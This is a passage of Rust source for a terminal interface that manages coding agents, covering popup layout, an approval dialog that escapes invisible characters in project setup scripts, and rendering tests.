        let hint_rows = wrap(SETUP_HINT, inner)
            .len()
            .max(wrap(SETUP_SCROLL_HINT, inner).len());
        let fixed = 2 + header.len() + 1 + 1 + hint_rows;
        let room = usize::from(screen.1).saturating_sub(fixed);
        let rows = body.len().min(room.max(1));
        SetupView {
            width: width as u16,
            header,
            body,
            rows,
            hint_width: inner,
            fits: room >= 1 && inner > SETUP_INDENT,
        }
    }

    fn max_scroll(&self) -> usize {
        self.body.len() - self.rows
    }

    fn lines(&self, scroll: usize, theme: &Theme) -> Vec<Line<'static>> {
        if !self.fits {
            return wrap(SETUP_TOO_SMALL, self.hint_width.max(1))
                .into_iter()
                .map(|l| Line::from(l).fg(theme.dim))
                .collect();
        }
        let scroll = scroll.min(self.max_scroll());
        let mut lines: Vec<Line> = self.header.iter().cloned().map(Line::from).collect();
        lines.push(Line::default());
        lines.extend(
            self.body[scroll..scroll + self.rows]
                .iter()
                .map(|l| Line::from(format!("{:SETUP_INDENT$}{l}", "")).fg(theme.accent)),
        );
        let below = self.max_scroll() - scroll;
        let marker = match (scroll, below) {
            (0, 0) => String::new(),
            (0, below) => format!("↓ {below} more below"),
            (above, 0) => format!("↑ {above} more above"),
            (above, below) => format!("↑ {above} more above · ↓ {below} more below"),
        };
        lines.push(Line::from(marker).fg(theme.dim));
        let hint = if below == 0 {
            SETUP_HINT
        } else {
            SETUP_SCROLL_HINT
        };
        lines.extend(
            wrap(hint, self.hint_width)
                .into_iter()
                .map(|l| Line::from(l).fg(theme.dim)),
        );
        lines
    }
}

/// How far the setup script can scroll and how many rows a page moves, in the popup
/// `Popup::ApproveSetup` draws on `screen`; `None` when the screen is too small to show it.
pub fn setup_scroll_limits(
    app: &App,
    project: &Path,
    script: &str,
    screen: (u16, u16),
) -> Option<(usize, usize)> {
    let view = SetupView::new(&setup_heading(app, project), script, screen);
    view.fits.then(|| (view.max_scroll(), view.rows))
}

fn setup_heading(app: &App, project: &Path) -> String {
    format!(
        "{}/{} runs this in every new worktree:",
        app.display_path(project),
        crate::project_config::FILE
    )
}

/// Characters that draw nothing or reorder what is drawn around them.
fn is_invisible(c: char) -> bool {
    matches!(c,
        '\u{ad}' | '\u{34f}' | '\u{61c}' | '\u{115f}'..='\u{1160}' | '\u{17b4}'..='\u{17b5}'
        | '\u{180b}'..='\u{180f}' | '\u{200b}'..='\u{200f}' | '\u{202a}'..='\u{202e}'
        | '\u{2060}'..='\u{206f}' | '\u{2800}' | '\u{3164}' | '\u{fe00}'..='\u{fe0f}'
        | '\u{feff}' | '\u{ffa0}' | '\u{fff9}'..='\u{fffb}' | '\u{e0000}'..='\u{e0fff}')
}

/// Shows control and invisible characters as escapes and a backslash as `\\`, so the
/// script cannot repaint the screen, hide text or pass an escape for plain text.
fn escaped(line: &str) -> String {
    line.chars()
        .map(|c| match c {
            '\\' => "\\\\".to_string(),
            c if c.is_control() => c.escape_default().to_string(),
            c if is_invisible(c) => c.escape_unicode().to_string(),
            c => c.to_string(),
        })
        .collect()
}

fn text_width(text: &str) -> usize {
    text.chars().map(char_width).sum()
}

fn char_width(c: char) -> usize {
    Span::raw(c.to_string()).width()
}

/// Splits `text` into rows of at most `width` cells, losing nothing.
fn wrap(text: &str, width: usize) -> Vec<String> {
    let mut rows = vec![String::new()];
    let mut used = 0;
    for c in text.chars() {
        let w = char_width(c);
        if used + w > width && used > 0 {
            rows.push(String::new());
            used = 0;
        }
        rows.last_mut().expect("a row").push(c);
        used += w;
    }
    rows
}

/// Splits each line of `text` into rows of at most `width` cells, between words where a word
/// fits; a line's leading spaces stay.
fn wrap_words(text: &str, width: usize) -> Vec<String> {
    let mut rows = Vec::new();
    for line in text.split('\n') {
        let mut row = String::new();
        for (index, word) in line.trim_end_matches('\r').split(' ').enumerate() {
            if index > 0
                && !row.trim_start().is_empty()
                && text_width(&row) + 1 + text_width(word) > width
            {
                rows.extend(wrap(&std::mem::take(&mut row), width));
            } else if index > 0 {
                row.push(' ');
            }
            row.push_str(word);
        }
        rows.extend(wrap(&row, width));
    }
    rows
}

struct PopupContent {
    title: String,
    width: u16,
    height: u16,
    lines: Vec<Line<'static>>,
    /// Column and row inside the border, for the text field being edited.
    cursor: Option<(u16, u16)>,
}

impl PopupContent {
    fn new(title: impl Into<String>, width: u16, lines: Vec<Line<'static>>) -> Self {
        PopupContent {
            title: title.into(),
            width,
            height: lines.len() as u16 + 2,
            lines,
            cursor: None,
        }
    }

    fn fitting(title: impl Into<String>, min_width: u16, lines: Vec<Line<'static>>) -> Self {
        let width = lines.iter().map(Line::width).max().unwrap_or(0) as u16 + 4;
        Self::new(title, width.max(min_width), lines)
    }

    /// Puts the cursor at the end of `row`.
    fn cursor_at(mut self, row: Option<usize>) -> Self {
        self.cursor = row.map(|row| (self.lines[row].width() as u16, row as u16));
        self
    }
}

pub fn popup_area(app: &App, screen: Rect) -> Option<Rect> {
    let popup = app.popup.as_ref().filter(|p| **p != Popup::Filter)?;
    let content = popup_content(popup, app, (screen.width, screen.height));
    Some(centered(screen, content.width, content.height))
}

fn popup_content(popup: &Popup, app: &App, screen: (u16, u16)) -> PopupContent {
    let theme = &app.theme;
    match popup {
        Popup::Help => {
            let title = match app.help_filter.as_str() {
                "" => " Help · type to filter ".to_string(),
                filter => format!(" Help · /{filter} "),
            };
            PopupContent::fitting(title, 0, help_lines(app))
        }
        Popup::Filter => PopupContent::new(" Filter ", 0, Vec::new()),
        Popup::ApproveSetup {
            project,
            script,
            scroll,
            ..
        } => {
            let view = SetupView::new(&setup_heading(app, project), script, screen);
            let lines = view.lines(*scroll, theme);
            PopupContent::new(" Run setup script? ", view.width, lines)
        }
        Popup::Finish { index, .. } => {
            let mut lines: Vec<Line> = app
                .finish_choices()
                .into_iter()
                .enumerate()
                .map(|(row, choice)| {
                    let text = app.finish_label(choice);
                    if row == *index {
                        Line::from(format!("▸ {text}")).style(selection_style(true, theme))
                    } else {
                        Line::from(format!("  {text}"))
                    }
                })
                .collect();
            lines.push(Line::default());
            lines.push(Line::from(CHOICE_HINT).fg(theme.dim));
            PopupContent::fitting(" Finish ", 40, lines)
        }
        Popup::Commands { index } => {
            PopupContent::fitting(" Commands ", 40, command_menu_lines(app, *index))
        }
        Popup::CommandPrompt(run) => command_prompt_content(app, run),
        Popup::Comment {
            location,
            code,
            input,
            ..
        } => {
            let removed = if location.removed { " (removed)" } else { "" };
            let lines = vec![
                Line::from(code.clone()).fg(theme.dim),
                Line::from(input.clone()),
                Line::default(),
                Line::from(COMMENT_HINT).fg(theme.dim),
            ];
            let title = format!(" Comment on {}:{}{removed} ", location.file, location.line);
            PopupContent::new(title, 60, lines).cursor_at(Some(1))
        }
        Popup::Reply { agent, input } => {
            let name = app
                .agents
                .iter()
                .find(|a| a.id == *agent)
                .map_or("agent", label);
            let lines = vec![
                Line::from(input.clone()),
                Line::default(),
                Line::from(REPLY_HINT).fg(theme.dim),
            ];
            PopupContent::new(format!(" Reply to {name} "), 60, lines).cursor_at(Some(0))
        }
        Popup::Output {
            title,
            lines,
            scroll,
        } => {
            let room = usize::from(screen.0.saturating_sub(4)).max(1);
            let lines: Vec<Line> = lines
                .iter()
                .skip(*scroll)
                .flat_map(|l| wrap_words(l, room))
                .map(Line::from)
                .collect();
            let lines = if lines.is_empty() {
                vec![Line::from("(no output)").fg(theme.dim)]
            } else {
                lines
            };
            PopupContent::fitting(format!(" {title} · {OUTPUT_HINT} "), 60, lines)
        }
        Popup::NewAgent(form) => {
            let (lines, cursor) = form_lines(form, app);
            PopupContent::new(" New agent ", NEW_AGENT_WIDTH, lines).cursor_at(cursor)
        }
        Popup::Rename {
            input, submission, ..
        } => {
            let mut lines = vec![
                field_line("Name: ", input.clone(), true, theme),
                Line::default(),
            ];
            lines.extend(form_footer(submission, INPUT_HINT, FORM_WIDTH, theme));
            PopupContent::new(" Rename ", FORM_WIDTH, lines).cursor_at(Some(0))
        }
        Popup::ProjectPicker { index } => {
            PopupContent::fitting(" Add project ", 60, picker_lines(app, *index))
        }
        Popup::AddProject(form) => {
            let (lines, cursor) = project_form_lines(form, theme);
            PopupContent::new(" Add project ", FORM_WIDTH, lines).cursor_at(Some(cursor))
        }
        Popup::Confirm { prompt, action } => {
            let mut lines: Vec<Line> = prompt.lines().map(|l| Line::from(l.to_string())).collect();
            if !action.names_its_keys() {
                lines.push(Line::from(CONFIRM_HINT).fg(theme.dim));
            }
            PopupContent::fitting(" Confirm ", 50, lines)
        }
    }
}

fn draw_popup(frame: &mut Frame, popup: &Popup, app: &App, screen: Rect) {
    let content = popup_content(popup, app, (screen.width, screen.height));
    let area = centered(screen, content.width, content.height);
    let block = block(content.title, true, &app.theme);
    let inner = block.inner(area);
    frame.render_widget(Clear, area);
    frame.render_widget(Paragraph::new(content.lines).block(block), area);
    if let Some((col, row)) = content.cursor.filter(|_| !popup.is_sending())
        && row < inner.height
        && inner.width > 0
    {
        frame.set_cursor_position(Position::new(
            inner.x + col.min(inner.width - 1),
            inner.y + row,
        ));
    }
}

/// The rows under a form's fields in a popup `width` cells wide: the daemon's refusal, if any,
/// and the form's `hint`, or what the form waits for while it waits.
fn form_footer(
    submission: &Submission,
    hint: &'static str,
    width: u16,
    theme: &Theme,
) -> Vec<Line<'static>> {
    let room = usize::from(width.saturating_sub(4)).max(1);
    match submission {
        Submission::Editing => vec![Line::from(hint).fg(theme.dim)],
        Submission::Sending(_) => vec![Line::from(SENDING_HINT).fg(theme.dim)],
        Submission::Failed(error) => wrap_words(error, room)
            .into_iter()
            .map(|row| Line::from(row).fg(theme.error))
            .chain([Line::from(hint).fg(theme.dim)])
            .collect(),
    }
}

/// A form row: the label is bold in the accent colour while the field has focus.
fn field_line(label: &'static str, value: String, focused: bool, theme: &Theme) -> Line<'static> {
    let label = Span::raw(label);
    let label = if focused {
        label.fg(theme.accent).bold()
    } else {
        label
    };
    Line::from(vec![label, Span::raw(value)])
}

/// Rows are `(keys, description, applies)`; a sidebar action that cannot act on the
/// selection is dimmed. `app.help_filter` keeps only the rows whose keys or description
/// contain it, ignoring case, and the key column keeps its width while filtering.
fn help_lines(app: &App) -> Vec<Line<'static>> {
    let keymap = &app.keymap;
    let sidebar: Vec<(String, String, bool)> = SIDEBAR_HELP
        .iter()
        .map(|(actions, text)| {
            let keys: Vec<String> = actions.iter().map(|a| keymap.describe(*a)).collect();
            let applies = actions.iter().any(|a| app.unavailable(*a).is_none());
            (keys.join(", "), text.to_string(), applies)
        })
        .collect();
    let mut pane = Vec::new();
    for (action, text) in [
        (Action::PaneLeave, "back to the sidebar"),
        (Action::PaneNext, "next agent"),
        (Action::PanePrevious, "previous agent"),
    ] {
        pane.push((keymap.describe(action), text.to_string(), true));
        let direct = keymap.direct_keys(action);
        if !direct.is_empty() {
            pane.push((crate::keymap::join(&direct), text.to_string(), true));
        }
    }
    pane.extend([
        (
            keymap.describe(Action::PaneScroll),
            "scroll the agent's history".to_string(),
            true,
        ),
        (
            keymap.describe(Action::PaneSendPrefix),
            format!("send {} to the agent", keymap.prefix()),
            true,
        ),
    ]);
    let custom: Vec<(String, String, bool)> = app
        .commands
        .iter()
        .filter_map(|c| Some((c.key?.to_string(), c.description.clone(), true)))
        .collect();
    let width = sidebar
        .iter()
        .chain(&pane)
        .chain(&custom)
        .map(|(key, ..)| key.chars().count())
        .max()
        .unwrap_or(0);
    let filter = app.help_filter.to_lowercase();
    let matches = |key: &str, text: &str| {
        key.to_lowercase().contains(&filter) || text.to_lowercase().contains(&filter)
    };
    let dim = app.theme.dim;
    let mut lines = Vec::new();
    for (title, rows) in [
        ("Sidebar", sidebar),
        ("Agent pane", pane),
        ("Commands", custom),
    ] {
        let rows: Vec<Line> = rows
            .into_iter()
            .filter(|(key, text, _)| matches(key, text))
            .map(|(key, text, applies)| {
                let line = Line::from(format!("  {key:<width$}  {text}"));
                if applies { line } else { line.fg(dim) }
            })
            .collect();
        if rows.is_empty() {
            continue;
        }
        if !lines.is_empty() {
            lines.push(Line::default());
        }
        lines.push(Line::from(title).bold());
        lines.extend(rows);
    }
    if lines.is_empty() {
        lines.push(Line::from(format!("no key matches \"{}\"", app.help_filter)).fg(dim));
    }
    lines
}

/// Shows at most `PICKER_ROWS` rows, scrolled so the highlighted one is visible.
fn command_menu_lines(app: &App, index: usize) -> Vec<Line<'static>> {
    if app.commands.is_empty() {
        return vec![
            Line::from("no commands yet: add [[commands]] to config.toml"),
            Line::default(),
            Line::from("esc close").fg(app.theme.dim),
        ];
    }
    let keys: Vec<String> = app
        .commands
        .iter()
        .map(|c| c.key.map(|k| k.to_string()).unwrap_or_default())
        .collect();
    let width = keys.iter().map(|k| k.chars().count()).max().unwrap_or(0);
    let mut lines: Vec<Line> = app
        .commands
        .iter()
        .zip(&keys)
        .enumerate()
        .map(|(row, (command, key))| {
            let text = format!("{key:<width$}  {}", command.description);
            if row == index {
                Line::from(format!("▸ {text}")).style(selection_style(true, &app.theme))
            } else {
                Line::from(format!("  {text}"))
            }
        })
        .collect();
    lines.push(Line::default());
    lines.push(Line::from(MENU_HINT).fg(app.theme.dim));
    lines
}

fn command_prompt_content(app: &App, run: &CommandRun) -> PopupContent {
    let Some(command) = app.commands.get(run.command) else {
        return PopupContent::new(" Command ", 40, Vec::new());
    };
    let dim = app.theme.dim;
    let titled = |title: &str| match title {
        "" => format!(" {} ", command.description),
        title => format!(" {title} "),
    };
    match command.prompts.get(run.step) {
        Some(Prompt::Input { title, .. }) => {
            let lines = vec![
                Line::from(run.input.clone()),
                Line::default(),
                Line::from(INPUT_HINT).fg(dim),
            ];
            PopupContent::new(titled(title), 60, lines).cursor_at(Some(0))
        }
        Some(Prompt::Menu { title, options, .. }) => {
            let mut lines: Vec<Line> = options
                .iter()
                .enumerate()
                .map(|(row, option)| {
                    if row == run.choice {
                        Line::from(format!("▸ {option}")).style(selection_style(true, &app.theme))
                    } else {
                        Line::from(format!("  {option}"))
                    }
                })
                .collect();
            lines.push(Line::default());
            lines.push(Line::from(CHOICE_HINT).fg(dim));
            PopupContent::fitting(titled(title), 40, lines)
        }
        Some(Prompt::Confirm { title }) => {
            let question = match title.as_str() {
                "" => format!("Run {}?", command.description),
                title => title.to_string(),
            };
            let lines = vec![Line::from(question), Line::from(CONFIRM_HINT).fg(dim)];
            PopupContent::fitting(" Confirm ", 50, lines)
        }
        None => PopupContent::new(titled(""), 40, Vec::new()),
    }
}

fn picker_lines(app: &App, index: usize) -> Vec<Line<'static>> {
    let candidates = app.project_candidates();
    let width = candidates
        .iter()
        .map(|k| k.name.chars().count())
        .max()
        .unwrap_or(0);
    let rows = std::iter::once("+ new project…".to_string()).chain(
        candidates
            .iter()
            .map(|k| format!("{:<width$}  {}", k.name, app.display_path(&k.path))),
    );
    let start = (index + 1).saturating_sub(PICKER_ROWS);
    let mut lines: Vec<Line> = rows
        .enumerate()
        .skip(start)
        .take(PICKER_ROWS)
        .map(|(row, text)| {
            if row == index {
                Line::from(format!("▸ {text}")).style(selection_style(true, &app.theme))
            } else {
                Line::from(format!("  {text}"))
            }
        })
        .collect();
    lines.push(Line::default());
    lines.push(Line::from(PICKER_HINT).fg(app.theme.dim));
    lines
}

/// Returns the lines and the row of the focused field.
fn project_form_lines(form: &ProjectForm, theme: &Theme) -> (Vec<Line<'static>>, usize) {
    let name = if form.name.is_empty() && form.field != ProjectField::Name {
        "(directory name)"
    } else {
        form.name.as_str()
    };
    let mut lines = vec![
        field_line(
            "Path: ",
            form.path.clone(),
            form.field == ProjectField::Path,
            theme,
        ),
        field_line(
            "Name: ",
            name.to_string(),
            form.field == ProjectField::Name,
            theme,
        ),
        Line::default(),
    ];
    lines.extend(form_footer(
        &form.submission,
        PROJECT_FORM_HINT,
        FORM_WIDTH,
        theme,
    ));
    let row = match form.field {
        ProjectField::Path => 0,
        ProjectField::Name => 1,
    };
    (lines, row)
}

/// Returns the lines and, when the focused field takes text, its row.
fn form_lines(form: &NewAgentForm, app: &App) -> (Vec<Line<'static>>, Option<usize>) {
    let mut rows: Vec<(Field, &'static str, String)> = vec![
        (Field::Name, "Name:    ", form.name.clone()),
        (
            Field::Preset,
            "Preset:  ",
            format!("‹ {} ›", form.preset.label(&app.presets)),
        ),
    ];
    if form.preset == Preset::Custom {
        rows.push((Field::Command, "Command: ", form.command.clone()));
    }
    let toggle = match (form.outside_git, form.worktree) {
        (true, _) => "off (not a git repository)",
        (false, true) => "[x]",
        (false, false) => "[ ]",
    };
    rows.push((Field::Worktree, "Worktree: ", toggle.to_string()));
    if form.worktree {
        let base = if form.base.is_empty() && form.field != Field::Base {
            "(current branch)".to_string()
        } else {
            form.base.clone()
        };
        rows.push((Field::Base, "Base:    ", base));
    }
    let prompt = if form.prompt.is_empty() && form.field != Field::Prompt {
        "(none)".to_string()
    } else {
        form.prompt.clone()
    };
    rows.push((Field::Prompt, "Prompt:  ", prompt));
    let cursor = rows.iter().position(|(field, ..)| {
        *field == form.field
            && matches!(
                field,
                Field::Name | Field::Command | Field::Base | Field::Prompt
            )
    });
    let mut lines: Vec<Line> = rows
        .into_iter()
        .map(|(field, label, value)| match field {
            Field::Worktree if form.outside_git => {
                Line::from(format!("{label}{value}")).fg(app.theme.dim)
            }
            _ => field_line(label, value, field == form.field, &app.theme),
        })
        .collect();
    lines.push(Line::default());
    lines.extend(form_footer(
        &form.submission,
        FORM_HINT,
        NEW_AGENT_WIDTH,
        &app.theme,
    ));
    (lines, cursor)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::app::tests::{agent, loaded, loaded_with, project, worktree_agent};
    use crate::app::{App, Effect, Focus, MouseInput, MouseKind, Popup, ProjectField, ProjectForm};
    use crate::config::Config;
    use crate::config::{DONE_BLUE, ERROR_RED, IDLE_GREEN, NEEDS_PURPLE, WORKING_YELLOW};
    use crate::known::KnownProject;
    use protocol::{Cell, Color as ScreenColor, GitStat, Screen, Status, Style as ScreenStyle};
    use ratatui::Terminal;
    use ratatui::backend::TestBackend;
    use ratatui::buffer::Buffer;
    use ratatui::crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
    use ratatui::layout::Rect;
    use std::time::Instant;

    fn render(app: &App) -> (String, Buffer) {
        render_at(app, 100, 30)
    }

    fn render_at(app: &App, width: u16, height: u16) -> (String, Buffer) {
        let mut terminal = Terminal::new(TestBackend::new(width, height)).expect("terminal");
        let areas = layout(Rect::new(0, 0, width, height), app);
        terminal
            .draw(|f| draw(f, app, &areas, Instant::now(), 0))
            .expect("draw");
        let buffer = terminal.backend().buffer().clone();
        let text = (0..buffer.area.height)
            .map(|y| {
                (0..buffer.area.width)
                    .map(|x| buffer[(x, y)].symbol())
                    .collect::<String>()
            })
            .collect::<Vec<_>>()
            .join("\n");
        (text, buffer)
    }

    #[test]
    fn empty_state_shows_hints() {
        let app = App::new("/w".into(), "/bin/sh".into(), None, Config::default());
        let (text, _) = render(&app);
        assert!(text.contains("press a to add a project"), "{text}");
        assert!(text.contains("press n to start an agent"), "{text}");
        assert!(text.contains(" lazyagents "), "{text}");
    }

    #[test]
    fn an_empty_filter_result_says_how_to_clear_the_filter() {
        let p = project("p");
        let (mut app, _) = loaded(vec![p.clone()], vec![agent(&p, "api", Status::Idle)]);
        for key in ['/', 'z', 'z'] {
            let _ = app.on_key(KeyEvent::new(KeyCode::Char(key), KeyModifiers::NONE));
        }
        let _ = app.on_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
        let (text, _) = render_at(&app, 120, 30);
        assert!(text.contains("no agents match /zz · esc clears"), "{text}");
        assert_eq!(text.matches("no agents match /zz").count(), 2, "{text}");
        assert!(!text.contains("to start an agent"), "{text}");
    }

    #[test]
    fn claude_agents_are_listed_by_their_session_title() {
        let p = project("p");
        let mut titled = agent(&p, "claude-1", Status::Idle);
        titled.kind = AgentKind::Claude;
        titled.title = Some("Fix it".into());
        let mut untitled = agent(&p, "claude-2", Status::Idle);
        untitled.kind = AgentKind::Claude;
        let mut shell = agent(&p, "sh", Status::Idle);
        shell.title = Some("~/git/x".into());
        let (mut app, _) = loaded(vec![p], vec![titled, untitled, shell]);
        let (text, _) = render(&app);
        assert!(text.contains("● Fix it  idle"), "{text}");
        assert!(text.contains("● claude-2  idle"), "{text}");
        assert!(text.contains("● sh  idle"), "{text}");
        assert!(!text.contains("~/git/x"), "{text}");
        assert!(text.contains(" Fix it · claude · idle "), "{text}");
        let info = info_box(&app);
        assert!(
            !info.iter().any(|line| line.contains("claude-1")),
            "{info:?}"
        );

        let _ = app.on_key(KeyEvent::new(KeyCode::Char('A'), KeyModifiers::SHIFT));
        let (text, _) = render(&app);
        assert!(text.contains("p/Fix it"), "{text}");
    }

    #[test]
    fn sidebar_lists_projects_agents_and_attention() {
        let p = project("alpha-repo");
        let (app, _) = loaded(
            vec![p.clone()],
            vec![
                agent(&p, "api", Status::NeedsInput),
                agent(&p, "docs", Status::Idle),
            ],
        );
        let (text, _) = render(&app);
        assert!(text.contains("alpha-repo ● 1"), "{text}");
        assert!(text.contains("● api  needs input"), "{text}");
        assert!(text.contains("● docs  idle"), "{text}");
        assert!(text.contains(" api · generic · needs input "), "{text}");
    }

    #[test]
    fn the_help_shows_only_rows_matching_the_filter() {
        let p = project("p");
        let (mut app, _) = loaded(vec![p.clone()], vec![agent(&p, "a", Status::Idle)]);
        app.popup = Some(Popup::Help);
        let (text, _) = render(&app);
        assert!(text.contains(" Help · type to filter "), "{text}");
        app.help_filter = "DIFF".into();
        let (text, _) = render(&app);
        assert!(text.contains(" Help · /DIFF "), "{text}");
        assert!(text.contains("diff / finish"), "{text}");
        assert!(!text.contains("new agent"), "{text}");
        assert!(!text.contains("Agent pane"), "{text}");
        app.help_filter = "zzz".into();
        let (text, _) = render(&app);
        assert!(text.contains("no key matches \"zzz\""), "{text}");
    }

    #[test]
    fn the_help_dims_what_cannot_act_on_the_selection() {
        let p = project("p");
        let (mut app, _) = loaded(vec![p.clone()], vec![agent(&p, "a", Status::Stopped)]);
        app.popup = Some(Popup::Help);
        let (text, buffer) = render_at(&app, 100, 40);
        let row = |needle: &str| {
            let y = text
                .lines()
                .position(|l| l.contains(needle))
                .unwrap_or_else(|| panic!("no {needle:?}\n{text}"));
            let x = text.lines().nth(y).and_then(|l| l.find(needle)).expect("x");
            let x = text.lines().nth(y).expect("row")[..x].chars().count();
            buffer[(x as u16, y as u16)].fg
        };
        assert_eq!(row("approve / deny / reply"), app.theme.dim);
        assert_ne!(row("stop / restart agent"), app.theme.dim);
        assert_ne!(row("new agent"), app.theme.dim);
    }

    #[test]
    fn the_status_bar_starts_with_what_the_agent_needs() {
        let p = project("p");
        let (app, _) = loaded(vec![p.clone()], vec![agent(&p, "a", Status::Stopped)]);
        let (text, _) = render(&app);
        let status = text.lines().last().expect("status");
        assert!(status.starts_with("enter start · ? help"), "{status}");
        let (app, _) = loaded(vec![p.clone()], vec![agent(&p, "a", Status::Exited(1))]);
        let (text, _) = render(&app);
        let status = text.lines().last().expect("status");
        assert!(status.starts_with("enter restart · ? help"), "{status}");
    }

    #[test]
    fn a_pane_whose_agent_is_not_running_says_how_to_bring_it_back() {
        let p = project("p");
        for (status, banner) in [
            (Status::Exited(0), "exited (0) · enter restart · d remove"),
            (
                Status::Exited(130),
                "exited (130) · enter restart · d remove",
            ),
            (Status::Stopped, "stopped · enter start · d remove"),
        ] {
            let (app, _) = loaded(vec![p.clone()], vec![agent(&p, "a", status)]);
            let (text, _) = render(&app);
            let areas = layout(Rect::new(0, 0, 100, 30), &app);
            let row = areas.pane_inner.y + areas.pane_inner.height - 1;
            let line = text.lines().nth(row.into()).expect("banner row");
            assert!(line.contains(banner), "{line}");
        }
        let (app, _) = loaded(vec![p.clone()], vec![agent(&p, "a", Status::Idle)]);
        let (text, _) = render(&app);
        assert!(!text.contains("enter restart"), "{text}");
    }

    fn usage(context: u8, five_hour: u8, seven_day: u8) -> protocol::Usage {
        protocol::Usage {
            model: Some("Opus".into()),
            cost_micros: Some(420_000),
            context_percent: Some(context),
            five_hour_percent: Some(five_hour),
            seven_day_percent: Some(seven_day),
            pr_number: Some(7),
            pr_review: Some("changes_requested".into()),
        }
    }

    fn info_box(app: &App) -> Vec<String> {
        let (text, _) = render(app);
        let info = layout(Rect::new(0, 0, 100, 30), app).info;
        text.lines()
            .skip(usize::from(info.y + 1))
            .take(usize::from(info.height.saturating_sub(2)))
            .map(|line| {
                let inner: String = line
                    .chars()
                    .skip(usize::from(info.x + 1))
                    .take(usize::from(info.width.saturating_sub(2)))
                    .collect();
                inner.trim_end().to_string()
            })
            .filter(|line| !line.is_empty())
            .collect()
    }

    #[test]
    fn the_info_box_lists_one_aligned_fact_per_row() {
        let p = project("p");
        let reported = AgentInfo {
            usage: Some(Box::new(usage(23, 24, 41))),
            cwd: "/home/u/git/a-very-long-project-name".into(),
            ..worktree_agent(&p, "api")
        };
        let id = reported.id;
        let (mut app, _) = loaded(vec![p], vec![reported]);
        app.git_stats.insert(
            id,
            GitStat {
                insertions: 12,
                deletions: 3,
                files: 4,
                uncommitted: 2,
            },
        );
        assert_eq!(
            info_box(&app),
            [
                "branch  lazyagents/api",
                "changes +12 −3",
                "files   4 changed",
                "        2 uncommitted",
                "PR      #7 changes req…",
                "model   Opus",
                "context ██░░░░░░ 23%",
                "cost    $0.42",
                "limits  5h 24% · 7d 41%",
                "cwd     …g-project-name",
            ]
        );
    }

    #[test]
    fn a_selected_project_shows_its_path_from_home() {
        let mut p = project("p");
        p.path = "/home/u/git/p".into();
        let (mut app, _) = loaded(vec![p], vec![]);
        app.focus = Focus::Projects;
        assert_eq!(info_box(&app), ["path    ~/git/p"]);
    }

    #[test]
    fn usage_turns_yellow_then_red_as_it_nears_its_limit() {
        let p = project("p");
        let theme = Theme::default();
        for (context, colour) in [(23, Color::Reset), (65, theme.working), (85, theme.error)] {
            let reported = AgentInfo {
                usage: Some(Box::new(usage(context, 24, 90))),
                ..agent(&p, "api", Status::Idle)
            };
            let (app, _) = loaded(vec![p.clone()], vec![reported]);
            let (_, buffer) = render(&app);
            let info = layout(Rect::new(0, 0, 100, 30), &app).info;
            let bar = find_text(&buffer, info, "█");
            assert_eq!(buffer[bar].fg, colour, "{context}%");
            let percent = find_text(&buffer, info, &format!(" {context}%"));
            assert_eq!(buffer[(percent.0 + 1, percent.1)].fg, colour, "{context}%");
            let five_hour = find_text(&buffer, info, "24%");
            assert_eq!(buffer[five_hour].fg, Color::Reset);
            let seven_day = find_text(&buffer, info, "90%");
            assert_eq!(buffer[seven_day].fg, theme.error);
        }
    }

    #[test]
    fn a_narrow_sidebar_shows_context_without_its_bar() {
        let p = project("p");
        let reported = AgentInfo {
            usage: Some(Box::new(usage(23, 24, 41))),
            ..agent(&p, "api", Status::Idle)
        };
        let (mut app, _) = loaded(vec![p], vec![reported]);
        app.screen_mode = ScreenMode::Wide;
        let rows = info_box(&app);
        assert!(rows.iter().any(|row| row == "context 23%"), "{rows:?}");
        assert!(!rows.iter().any(|row| row.contains('█')), "{rows:?}");
    }

    #[test]
    fn a_waiting_agent_shows_what_it_waits_for_and_how_to_answer() {
        let p = project("p");
        let waiting = AgentInfo {
            waiting_for: Some("Bash: npm test".into()),
            ..agent(&p, "api", Status::NeedsInput)
        };
        let (mut app, _) = loaded(vec![p], vec![waiting.clone()]);
        let (text, _) = render(&app);
        assert!(text.contains("waiting Bash: npm test"), "{text}");
        assert!(!text.contains("status"), "{text}");
        let status = text.lines().last().expect("status line");
        assert!(
            status.starts_with("y approve · N deny · i reply · ? help"),
            "{status}"
        );
        app.popup = Some(Popup::Reply {
            agent: waiting.id,
            input: "use pnpm".into(),
        });
        let (text, _) = render(&app);
        assert!(text.contains(" Reply to api "), "{text}");
        assert!(text.contains("use pnpm"), "{text}");
    }

    #[test]
    fn command_popups_render_their_content() {
        let config = crate::config::parse(
            "[[commands]]\nkey = \"L\"\ndescription = \"lazygit\"\ncommand = \"lazygit\"\n\
             [[commands]]\ndescription = \"tests\"\ncommand = \"make test\"",
        )
        .expect("config");
        let p = project("p");
        let (mut app, _) = loaded_with(config, vec![p.clone()], vec![agent(&p, "a", Status::Idle)]);
        app.popup = Some(Popup::Commands { index: 1 });
        let (text, _) = render(&app);
        assert!(text.contains("  L  lazygit"), "{text}");
        assert!(text.contains("▸    tests"), "{text}");
        app.popup = Some(Popup::Output {
            title: "tests".into(),
            lines: vec!["first".into(), "second".into()],
            scroll: 1,
        });
        let (text, _) = render(&app);
        assert!(text.contains(" tests · j/k scroll · q close "), "{text}");
        assert!(text.contains("second") && !text.contains("first"), "{text}");
        app.popup = Some(Popup::Help);
        let (text, _) = render_at(&app, 100, 40);
        assert!(text.contains("Commands"), "{text}");
        assert!(text.contains("lazygit"), "{text}");
    }

    #[test]
    fn output_lines_wrap_to_the_screen_and_keep_their_indent() {
        let mut app = App::new("/w".into(), "/bin/sh".into(), None, Config::default());
        let warning =
            "/home/u/.config/lazyagents/config.toml: line 3: expected a value, found a newline";
        app.popup = Some(Popup::Output {
            title: "Config warnings".into(),
            lines: vec![warning.into(), String::new(), "  indented".into()],
            scroll: 0,
        });
        let (text, _) = render_at(&app, 50, 20);
        assert!(text.contains("found a newline"), "{text}");
        assert!(text.contains("│  indented"), "{text}");
    }

    fn asking_to_run(script: &str, scroll: usize) -> App {
        let mut app = App::new("/w".into(), "/bin/sh".into(), None, Config::default());
        app.popup = Some(Popup::ApproveSetup {
            form: Default::default(),
            create: Box::new(protocol::CreateAgent {
                project: protocol::ProjectId::random(),
                name: "a".into(),
                kind: AgentKind::Generic,
                command: Vec::new(),
                cols: 80,
                rows: 24,
                worktree: None,
                prompt: None,
                setup: None,
            }),
            project: "/w/p".into(),
            script: script.to_string(),
            scroll,
        });
        app
    }

    fn tall_setup() -> String {
        (1..=40)
            .map(|n| format!("echo step {n}"))
